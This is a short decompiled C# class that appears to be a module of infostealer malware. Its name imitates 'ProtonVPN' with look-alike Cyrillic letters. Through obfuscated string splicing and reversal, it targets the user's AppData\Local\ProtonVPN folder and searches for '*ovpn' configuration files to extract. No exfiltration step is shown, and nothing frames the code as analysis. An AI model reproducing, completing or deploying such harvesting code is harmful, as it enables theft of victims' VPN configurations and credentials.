using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

// Token: 0x0200001A RID: 26
public class РrоtoнVРN : Extractor
{
	// Token: 0x060000A2 RID: 162 RVA: 0x00007C6C File Offset: 0x0000606C
	public override string Id2(Entity_FileSearchInformation scannerArg, FileInfo fileInfo)
	{
		return string.Empty;
	}

	// Token: 0x060000A3 RID: 163 RVA: 0x00007C84 File Offset: 0x00006084
	public override IEnumerable<Entity_FileSearchInformation> Id3()
	{
		List<Entity_FileSearchInformation> list = new List<Entity_FileSearchInformation>();
		try
		{
			list.Add(new Entity_FileSearchInformation
			{
				Id1 = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPserviceInterface.ExtensionROFILE%\\ApserviceInterface.ExtensionpData\\LocaserviceInterface.Extensionl").Replace("serviceInterface.Extension", string.Empty), "ProldCharotonVoldCharPN".Replace("oldChar", string.Empty)),
				Id2 = new string("nSystem.CollectionspvoSystem.Collections*".Replace("System.Collections", string.Empty).Reverse<char>().ToArray<char>()),
				Id3 = false
			});
		}
		catch
		{
		}
		return list;
	}
}
